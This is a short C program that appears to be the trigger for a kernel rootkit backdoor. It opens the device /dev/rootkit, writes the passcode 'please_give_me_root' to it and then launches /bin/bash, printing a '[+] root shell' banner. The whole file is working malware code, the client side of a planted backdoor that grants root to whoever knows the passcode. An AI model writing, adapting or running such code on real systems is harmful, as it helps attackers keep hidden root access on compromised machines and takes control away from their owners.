#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

#define PLEASE_GIVE_ME_ROOT "please_give_me_root"

int main(void) {
	// open /dev/rootkit for writing and write the passcode
	FILE *fp = fopen("/dev/rootkit", "w");
	fprintf(fp, PLEASE_GIVE_ME_ROOT);
	fflush(fp);

	// spawn shell as a root id
	printf("[+] root shell:\n");
	system("/bin/bash");
	return 0;
}
